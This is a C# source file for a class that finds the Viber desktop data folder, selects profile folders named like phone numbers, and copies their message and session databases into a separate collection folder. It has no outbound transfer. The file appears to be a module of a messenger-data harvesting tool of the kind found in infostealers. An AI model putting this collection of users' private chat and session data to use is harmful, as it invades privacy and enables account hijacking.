using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger
{
    public class ViberService
    {
        public static async Task SaveViberAsync()
        {
            string viberFolder = Path.Combine(Common.AppData, "ViberPC");
            if (!Directory.Exists(viberFolder)) return;

            string viberSession = Common.EnsureViberPath();
            var pattern = @"^([\+|0-9][0-9.]{1,12})$";

            var directories = Directory.GetDirectories(viberFolder)
                                       .Where(d => MessengerHelper.ValidatePattern(Path.GetFileName(d), pattern));
            var rootFiles = Directory.GetFiles(viberFolder, "*.db")
                                     .Concat(Directory.GetFiles(viberFolder, "*.db-wal"));

            foreach (var rootFile in rootFiles)
            {
                string destFile = Path.Combine(viberSession, Path.GetFileName(rootFile));
                await Task.Run(() => File.Copy(rootFile, destFile, true));
            }

            foreach (var directory in directories)
            {
                string destinationPath = Path.Combine(viberSession, Path.GetFileName(directory));
                await MessengerHelper.CopyDirectoryAsync(directory, destinationPath);
                await MessengerHelper.CopyFilesAsync(directory, destinationPath, f => f.Name.EndsWith(".db") || f.Name.EndsWith(".db-wal"));
            }
        }
    }
}
